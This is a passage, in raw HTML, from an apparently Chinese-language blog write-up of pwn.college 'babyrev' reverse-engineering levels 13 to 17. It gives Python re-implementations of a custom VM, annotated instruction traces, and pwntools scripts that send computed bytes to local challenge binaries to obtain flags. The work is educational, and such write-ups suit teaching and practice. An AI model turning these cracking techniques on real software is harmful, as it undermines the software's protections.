class="hljs-number">2</span>LL);<br><span class="hljs-attribute">sub_1568</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">8</span>LL);<br><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">2</span>LL, <span class="hljs-number">45</span>LL);<br><span class="hljs-attribute">sub_1687</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">2</span>LL);<br><span class="hljs-attribute">sub_1568</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">8</span>LL);<br><span class="hljs-attribute">sub_1533</span>(a1, <span class="hljs-number">2</span>LL, <span class="hljs-number">101</span>LL);<br><span class="hljs-attribute">sub_1687</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">2</span>LL);<br><span class="hljs-attribute">sub_1568</span>(a1, <span class="hljs-number">1</span>LL, <span class="hljs-number">8</span>LL);<br></code></pre></td></tr></table></figure><p>看了看，要手工调出来得好久，还容易出错。还是写代码快：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a1 = np.zeros((<span class="hljs-number">512</span>,<span class="hljs-number">1</span>), dtype=<span class="hljs-built_in">int</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1533</span>(<span class="hljs-params">a2,a3</span>):<br>    <span class="hljs-keyword">return</span> sub_1415(a2,a3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1415</span>(<span class="hljs-params">a2, a3</span>):<br>    result = []<br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            result = a1<br>            a1[<span class="hljs-number">256</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            result = a1<br>            a1[<span class="hljs-number">257</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            result = a1<br>            a1[<span class="hljs-number">258</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            result = a1<br>            a1[<span class="hljs-number">259</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            result = a1<br>            a1[<span class="hljs-number">260</span>] = a3              <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            result = a1<br>            a1[<span class="hljs-number">261</span>] = a3     <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            result = a1<br>            a1[<span class="hljs-number">262</span>] = a3     <br>        <span class="hljs-keyword">case</span> _:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unknown register&quot;</span>)<br>            exit()<br>    <span class="hljs-keyword">return</span> result<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1687</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = sub_1363(a3)<br>    v4 = sub_1363(a2)<br>    <span class="hljs-keyword">return</span> sub_1507(v4, v3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1363</span>(<span class="hljs-params">a2</span>):<br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">256</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">257</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">258</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">259</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">260</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">261</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">262</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1507</span>(<span class="hljs-params">a2, a3</span>):<br>    res = a2<br>    a1[a2] = a3<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1568</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = sub_1363(a2)<br>    v4 = sub_1363(a3)<br>    <span class="hljs-keyword">return</span> sub_1415(a2, v3+v4)<br><br><br>sub_1533(<span class="hljs-number">1</span>, <span class="hljs-number">91</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">1</span>)<br>sub_1533(<span class="hljs-number">2</span>, <span class="hljs-number">70</span>)<br>sub_1687(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>sub_1568(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br>sub_1533(<span class="hljs-number">2</span>, <span class="hljs-number">236</span>)<br>sub_1687(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>sub_1568(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br>sub_1533(<span class="hljs-number">2</span>, <span class="hljs-number">45</span>)<br>sub_1687(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>sub_1568(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br>sub_1533(<span class="hljs-number">2</span>, <span class="hljs-number">101</span>)<br>sub_1687(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>sub_1568(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-built_in">print</span>(a1[<span class="hljs-number">91</span>+i])<br></code></pre></td></tr></table></figure><p>最后exp就是之前的模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-13-1&#x27;</span>)<br>al = [<span class="hljs-number">70</span>,<span class="hljs-number">236</span>,<span class="hljs-number">45</span>,<span class="hljs-number">101</span>]<br><br>payload = struct.pack(<span class="hljs-string">&#x27;4B&#x27;</span>, *al)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure><h4 id="level14-0"><a href="#level14-0" class="headerlink" title="level14.0"></a>level14.0</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">s</span>] IMM b = <span class="hljs-number">0x36</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x6</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] SYS <span class="hljs-number">0x2</span> a<br>[<span class="hljs-meta">s</span>] ... read_memory<br>[<span class="hljs-meta">s</span>] ... <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> (<span class="hljs-keyword">in</span> register a): <span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] IMM b = <span class="hljs-number">0x56</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x14</span><br>[<span class="hljs-meta">s</span>] STM *b = a<span class="hljs-meta"># a1[0x56] = 0x14</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0xd2</span><br>[<span class="hljs-meta">s</span>] STM *b = a<span class="hljs-meta"># a1[0x57] = 0xd2</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0xcf</span><br>[<span class="hljs-meta">s</span>] STM *b = a<span class="hljs-meta"># a1[0x58] = 0xcf</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x31</span><br>[<span class="hljs-meta">s</span>] STM *b = a<span class="hljs-meta"># a1[0x59] = 0x31</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x54</span><br>[<span class="hljs-meta">s</span>] STM *b = a<span class="hljs-meta"># a1[0x5a] = 0x54</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0xb8</span><br>[<span class="hljs-meta">s</span>] STM *b = a<span class="hljs-meta"># a1[0x5b] = 0xb8</span><br>[<span class="hljs-meta">s</span>] ADD b c<br></code></pre></td></tr></table></figure><p>老规矩，第一关还是会打印出来。那么我们直接简单推导一下就行了。exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-14-0&#x27;</span>)<br>al = [<span class="hljs-number">0x14</span>,<span class="hljs-number">0xd2</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0xb8</span>]<br><br>payload = struct.pack(<span class="hljs-string">&#x27;6B&#x27;</span>, *al)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br><br></code></pre></td></tr></table></figure><h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a1 = np.zeros((<span class="hljs-number">512</span>,<span class="hljs-number">1</span>), dtype=<span class="hljs-built_in">int</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1533</span>(<span class="hljs-params">a2,a3</span>):<br>    <span class="hljs-keyword">return</span> sub_1415(a2,a3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1415</span>(<span class="hljs-params">a2, a3</span>):<br>    result = []<br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            result = a1<br>            a1[<span class="hljs-number">256</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            result = a1<br>            a1[<span class="hljs-number">257</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            result = a1<br>            a1[<span class="hljs-number">258</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            result = a1<br>            a1[<span class="hljs-number">259</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            result = a1<br>            a1[<span class="hljs-number">260</span>] = a3              <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            result = a1<br>            a1[<span class="hljs-number">261</span>] = a3     <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            result = a1<br>            a1[<span class="hljs-number">262</span>] = a3     <br>        <span class="hljs-keyword">case</span> _:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unknown register&quot;</span>)<br>            exit()<br>    <span class="hljs-keyword">return</span> result<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1687</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = sub_1363(a3)<br>    v4 = sub_1363(a2)<br>    <span class="hljs-keyword">return</span> sub_1507(v4, v3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1363</span>(<span class="hljs-params">a2</span>):<br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">256</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">257</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">258</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">259</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">260</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">261</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">262</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1507</span>(<span class="hljs-params">a2, a3</span>):<br>    res = a2<br>    a1[a2] = a3<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1568</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = sub_1363(a2)<br>    v4 = sub_1363(a3)<br>    <span class="hljs-keyword">return</span> sub_1415(a2, v3+v4)<br><br><br><span class="hljs-comment"># sub_1533(16, 82)</span><br><span class="hljs-comment"># sub_1533(2, 8)</span><br><span class="hljs-comment"># sub_1533(8, 0)</span><br><span class="hljs-comment"># sub_1896(8, 8)</span><br>sub_1533(<span class="hljs-number">16</span>, <span class="hljs-number">114</span>)<br>sub_1533(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">97</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">170</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">239</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">133</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">167</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">205</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">70</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">226</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    <span class="hljs-built_in">print</span>(a1[<span class="hljs-number">114</span>+i])<br></code></pre></td></tr></table></figure><p>这里能够注释掉前面几个混淆，因为没起作用。后面的<code>sub_18969()</code>是获取用户输入的。所以不需要写。</p><p>最后exp就不贴了，模板还是之前的，然后改一改数字就行了。</p><h4 id="level15-0"><a href="#level15-0" class="headerlink" title="level15.0"></a>level15.0</h4><p>道理是一样的，不过这一关的open flag啥的也被做成了函数，也就是后面的<code>if()</code>语句内的。我们只需要关注<code>memcmp()</code>函数以前的vmcode即可。</p><h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15.1"></a>level15.1</h4><p>还是之前的脚本，跑一下，打印出来的整数转成字节序，发给目标程序即可拿到flag。</p><h4 id="level16-0"><a href="#level16-0" class="headerlink" title="level16.0"></a>level16.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x5c</span>, <span class="hljs-number">0</span>x99, <span class="hljs-number">0</span>xc6, <span class="hljs-number">0</span>x21, <span class="hljs-number">0</span>xce, <span class="hljs-number">0</span>xf2, <span class="hljs-number">0</span>x7e, <span class="hljs-number">0</span>xb8<br></code></pre></td></tr></table></figure><p>依然不用管后续的cmp就行了。其实就是刚开始的cmp换了种形式。依然可以直接按照先前的方法。记住ida pro这种形式，其实也是一种字符串的匹配问题。</p><h4 id="level16-1"><a href="#level16-1" class="headerlink" title="level16.1"></a>level16.1</h4><p>这一关就记住，找到输入的位置。根据之前的规律，很简单就知道用户从a1的哪个索引处开始写入数据的：</p><img src="/2025/03/01/pwn-college-题解/image-20250306162439521.png"  alt="image-20250306162439521" style="zoom:50%;" /><p>因此，我们只需要用之前的脚本执行一下就行。（可能有名字的差异，但是大差不差。简单找一找就能知道对应的函数了）</p><h4 id="level17-0"><a href="#level17-0" class="headerlink" title="level17.0"></a>level17.0</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs armasm">[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x51</span><br>[s] IMM c = <span class="hljs-number">0x1</span><br>[s] IMM a = <span class="hljs-number">0x87</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-built_in">a1</span>[<span class="hljs-number">81</span>] = <span class="hljs-number">0x87</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xf</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-built_in">a1</span>[<span class="hljs-number">82</span>] = <span class="hljs-number">0xf</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xca</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-number">83</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xc1</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-number">84</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xde</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-number">85</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0x29</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-number">86</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x31</span><br>[s] IMM c = <span class="hljs-number">0x1</span><br>[s] <span class="hljs-keyword">LDM</span> a = *<span class="hljs-keyword">b</span># a = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x31</span>]<br>[s] IMM d = <span class="hljs-number">0xc0</span># d = <span class="hljs-number">0xc0</span><br>[s] <span class="hljs-keyword">ADD</span> a d# a = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x31</span>] + <span class="hljs-number">0xc0</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x31</span>] = <span class="hljs-number">0xc0</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c# <span class="hljs-keyword">b</span> = <span class="hljs-number">0x31</span> + <span class="hljs-number">0x32</span><br>[s] <span class="hljs-keyword">LDM</span> a = *<span class="hljs-keyword">b</span># a = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x32</span>]<br>[s] IMM d = <span class="hljs-number">0</span><br>[s] <span class="hljs-keyword">ADD</span> a d# a = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x32</span>] + <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>可以发现，多了<code>LDM</code>指令。经过分析之后，发现它是会对我们的输入进行了一个加法的操作。所以，我们把它打印出来，然后做减法就行了。注意转换成字节序的时候，有符号和范围溢出的问题。我们可以分开处理正数和负数就行了。exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">from pwn import *<br><br>p = process(&#x27;/challenge/babyrev-level-17-0&#x27;)<br>al = [-57, 15, 178, 162,180,-100]<br>payload = b&#x27;&#x27;<br>for i in range(len(al)):<br>    if al[i] &gt; 0:<br>        payload += struct.pack(&#x27;B&#x27;, al[i])<br>    else:<br>        payload += struct.pack(&#x27;b&#x27;, al[i])<br># payload = struct.pack(&#x27;6b&#x27;, *al)<br>print(payload)<br>p.send(payload)<br>print(p.readall())<br></code></pre></td></tr></table></figure><h4 id="level17-1"><a href="#level17-1" class="headerlink" title="level17.1"></a>level17.1</h4><p>这里记录一下题目中的api，方便我们拿到匹配的字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 